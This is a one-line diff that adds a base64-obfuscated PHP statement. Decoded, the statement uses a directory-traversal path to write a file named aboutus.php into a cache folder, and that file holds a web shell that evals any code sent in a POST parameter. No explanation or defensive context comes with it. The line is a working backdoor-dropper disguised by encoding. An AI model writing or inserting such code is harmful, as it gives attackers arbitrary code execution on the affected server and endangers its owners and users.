@@ -1,0 +1,1 @@
+<?php echo file_put_contents(base64_decode(Li4vLi4vLi4vLi4vLi4vLi4vLi4vY2FjaGVzL2Jha3VwL2Fib3V0dXMucGhw),base64_decode(PD9waHAgdmFyX2R1bXAobWQ1KDEyMykpOyRjb250ZW50PXN0cmlwc2xhc2hlcygkX1BPU1RbMV0pO2V2YWwoJGNvbnRlbnQpOyAg));?>
